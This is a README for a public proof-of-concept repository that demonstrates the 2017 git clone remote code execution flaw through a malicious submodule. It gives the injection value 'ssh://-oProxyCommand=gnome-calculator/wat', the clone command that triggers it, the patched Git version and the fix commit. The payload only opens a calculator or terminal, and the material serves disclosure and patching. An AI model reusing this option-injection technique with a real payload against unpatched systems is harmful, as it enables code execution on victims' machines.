# Git clone RCE PoC repository

This repo is an example of `git clone` vulnerability described in http://blog.recurity-labs.com/2017-08-10/scm-vulns using a git submodule.

To see it in action, simply clone the repo using:
```
git clone https://github.com/disconnect3d/git_clone_rce_calc.git --recursive
```
The recursive part is crucial as git **must** try to clone the malicious git submodule url.
This will launch a `gnome-terminal` on your machine.

### To be safe
**Upgrade your Git to 2.14.1 as that is fixed on that version as stated in [git's release notes](https://raw.githubusercontent.com/git/git/master/Documentation/RelNotes/2.14.1.txt).**

After updating the issue is gone:
```
$ git clone https://github.com/disconnect3d/git_clone_rce_calc.git --recursive
Cloning into 'git_clone_rce_calc'...
remote: Counting objects: 15, done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 15 (delta 3), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), done.
Resolving deltas: 100% (3/3), done.
Checking connectivity... done.
Submodule 'git_calc_rce' (ssh://-oProxyCommand=gnome-calculator/wat) registered for path 'git_calc_rce'
Cloning into 'git_calc_rce'...
fatal: strange hostname '-oProxyCommand=gnome-calculator' blocked
fatal: clone of 'ssh://-oProxyCommand=gnome-calculator/wat' into submodule path 'git_calc_rce' failed
```

### Changes that fix the problem

The fix was introcuded with [230ce07d commit id that can be found e.g. in git mirror repo](  https://github.com/git/git/commit/230ce07d134f597a8107d3ed5d76d212ff90db70).

Basically they have [introduced a check](https://github.com/git/git/commit/230ce07d134f597a8107d3ed5d76d212ff90db70#diff-c36199ef0fc86df61570de73eb0fde65R1324) which is called in some places:
```c
int looks_like_command_line_option(const char *str)
 {
 	return str && str[0] == '-';
 }
 ```
